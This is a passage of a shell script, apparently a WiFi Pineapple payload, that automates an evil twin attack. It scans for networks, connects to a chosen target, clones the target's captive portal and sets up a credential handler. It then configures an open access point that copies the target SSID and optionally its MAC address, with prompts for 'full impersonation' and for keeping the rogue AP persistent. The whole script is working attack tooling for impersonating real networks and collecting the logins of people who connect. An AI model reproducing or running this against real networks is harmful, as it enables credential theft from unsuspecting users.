DEPENDENCIES="curl:curl wget:wget iw:iw wpa_supplicant:wpa-supplicant wpa_cli:wpa-supplicant"

LOG "Checking dependencies..."

MISSING_DEPS=""
MISSING_PKGS=""

# First pass: check what's missing
for dep in $DEPENDENCIES; do
    cmd="${dep%%:*}"
    pkg="${dep##*:}"
    
    if ! command -v "$cmd" >/dev/null 2>&1; then
        LOG yellow "  Missing: $cmd"
        MISSING_DEPS="$MISSING_DEPS $cmd"
        # Avoid duplicate packages
        if ! echo "$MISSING_PKGS" | grep -q "$pkg"; then
            MISSING_PKGS="$MISSING_PKGS $pkg"
        fi
    else
        LOG green "  Found: $cmd"
    fi
done

# If anything is missing, prompt to install
if [ -n "$MISSING_DEPS" ]; then
    LOG ""
    LOG yellow "Missing dependencies:$MISSING_DEPS"
    LOG yellow "Required packages:$MISSING_PKGS"
    
    resp=$(CONFIRMATION_DIALOG "Missing dependencies!\n\nInstall required packages?\n$MISSING_PKGS\n\nThis may take a few minutes.")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
            ERROR_DIALOG "Cannot proceed without\nrequired dependencies."
            exit 1
            ;;
        $DUCKYSCRIPT_ERROR)
            LOG red "Dialog error"
            exit 1
            ;;
    esac
    
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG ""
        LOG "Updating package lists..."
        START_SPINNER "Updating opkg..."
        opkg update >/dev/null 2>&1
        STOP_SPINNER
        
        for pkg in $MISSING_PKGS; do
            LOG "Installing $pkg..."
            START_SPINNER "Installing $pkg..."
            opkg install "$pkg" >/dev/null 2>&1
            STOP_SPINNER
            
            if opkg list-installed | grep -q "^${pkg} "; then
                LOG green "  Installed: $pkg"
            else
                LOG red "  Failed to install: $pkg"
                ERROR_DIALOG "Failed to install: $pkg\n\nCheck /etc/opkg/distfeeds.conf\nfor broken repositories."
                exit 1
            fi
        done
        
        # Verify all commands are now available
        LOG ""
        LOG "Verifying installation..."
        for dep in $DEPENDENCIES; do
            cmd="${dep%%:*}"
            if ! command -v "$cmd" >/dev/null 2>&1; then
                LOG red "  Still missing: $cmd"
                ERROR_DIALOG "Installation incomplete!\n\nMissing: $cmd"
                exit 1
            else
                LOG green "  Verified: $cmd"
            fi
        done
        LOG green "All dependencies installed!"
    else
        LOG "User declined installation"
        exit 1
    fi
fi

LOG ""

# Save original interface state before modifying
save_interface_state

# Phase 1: Scan for SSIDs
if ! scan_ssids; then
    exit 1
fi

# Phase 2: Select target SSID
if ! select_ssid; then
    exit 1
fi

# Phase 3: Connect to network
if ! connect_to_network; then
    exit 1
fi

# Phase 4: Detect captive portal
if ! detect_captive_portal; then
    LOG "No portal to clone"
    exit 1
fi

# Phase 5: Clone the portal
if ! clone_portal; then
    exit 1
fi

# Phase 6: Create credential handler
create_credential_handler

# Success!
led_success
VIBRATE 100

LOG ""
LOG green "=========================================="
LOG green "  CLONE COMPLETE!"
LOG green "=========================================="
LOG ""
LOG "Portal saved to:"
LOG "  $CLONED_PORTAL_DIR"
LOG ""

# =============================================================================
# PHASE 7: DEPLOYMENT OPTIONS
# =============================================================================

# Ask if user wants to configure Open AP with cloned SSID
RESP=$(CONFIRMATION_DIALOG "Configure Evil Twin?\n\nSet Open AP SSID to:\n$TARGET_SSID\n\n[Yes] = Auto-configure\n[No] = Manual setup later")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Deployment skipped"
        ALERT "Portal Cloned!\n\nSSID: $TARGET_SSID\nSaved: $CLONED_PORTAL_NAME\n\nRun 'goodportal Configure'\nto deploy manually"
        exit 0
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG yellow "Dialog error, skipping deployment"
        exit 0
        ;;
esac

CONFIGURE_OPEN_AP=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        CONFIGURE_OPEN_AP=1
        ;;
    *)
        LOG "Skipping Open AP configuration"
        ALERT "Portal Cloned!\n\nSSID: $TARGET_SSID\nSaved: $CLONED_PORTAL_NAME\n\nRun 'goodportal Configure'\nto deploy manually"
        exit 0
        ;;
esac

# Backup current Open AP config before modifying
backup_open_ap_config

# Ask about MAC cloning for full evil twin
RESP=$(CONFIRMATION_DIALOG "Clone MAC address too?\n\nTarget: $TARGET_BSSID\n\n[Yes] = Full impersonation\n[No] = SSID only")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Cancelled"
        exit 0
        ;;
esac

CLONE_MAC=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        CLONE_MAC=1
        LOG "MAC cloning: YES"
        ;;
    *)
        LOG "MAC cloning: NO"
        ;;
esac

# Ask about SSID Pool
RESP=$(CONFIRMATION_DIALOG "Add to SSID Pool?\n\nSSID: $TARGET_SSID\n\n[Yes] = Save for future use\n[No] = Open AP only")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Cancelled"
        exit 0
        ;;
esac

ADD_TO_POOL=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        ADD_TO_POOL=1
        LOG "Add to SSID Pool: YES"
        ;;
    *)
        LOG "Add to SSID Pool: NO"
        ;;
esac

LOG ""
LOG yellow "Applying configuration..."

# Configure Open AP
if [ "$CLONE_MAC" -eq 1 ]; then
    set_open_ap "$TARGET_SSID" "$TARGET_BSSID"
else
    set_open_ap "$TARGET_SSID" ""
fi

# Add to SSID Pool if requested
if [ "$ADD_TO_POOL" -eq 1 ]; then
    LOG "Adding to SSID Pool..."
    PINEAPPLE_SSID_POOL_ADD "$TARGET_SSID"
    sleep 1
    LOG green "  Added to SSID Pool"
fi

led_success
VIBRATE 100

LOG ""
LOG green "=========================================="
LOG green "  EVIL TWIN CONFIGURED!"
LOG green "=========================================="
LOG ""
LOG "Open AP now broadcasting:"
LOG "  SSID: $TARGET_SSID"
[ "$CLONE_MAC" -eq 1 ] && LOG "  MAC:  $TARGET_BSSID"
LOG ""
LOG cyan "Configuration is PERSISTENT!"
LOG cyan "Check: Settings > Open AP"
LOG ""
LOG "Portal ready at: $CLONED_PORTAL_DIR"
LOG ""
LOG yellow "Next step: Run 'goodportal Configure'"
LOG yellow "and select '$CLONED_PORTAL_NAME'"
LOG ""

# Show result
if [ "$CLONE_MAC" -eq 1 ]; then
    ALERT "Evil Twin Ready!\n\nSSID: $TARGET_SSID\nMAC: $TARGET_BSSID\n\nRun 'goodportal Configure'\nto serve the cloned portal"
else
    ALERT "Evil Twin Ready!\n\nSSID: $TARGET_SSID\n\nRun 'goodportal Configure'\nto serve the cloned portal"
fi

# Ask if user wants to restore Open AP config later
RESP=$(CONFIRMATION_DIALOG "Restore original Open AP\nconfig when done?\n\nOriginal: $ORIGINAL_OPEN_AP_SSID\n\n[Yes] = Restore now\n[No] = Keep evil twin")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        exit 0
        ;;
esac

case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        LOG "Restoring original Open AP config..."
        restore_open_ap_config
        led_success
        ALERT "Original config restored!\n\nSSID: $ORIGINAL_OPEN_AP_SSID\n\nPortal still saved at:\n$CLONED_PORTAL_NAME"
        ;;
    *)
        LOG "Keeping evil twin configuration"
        rm -f /tmp/clone_portal_backup_*
        ;;
esac

exit 0
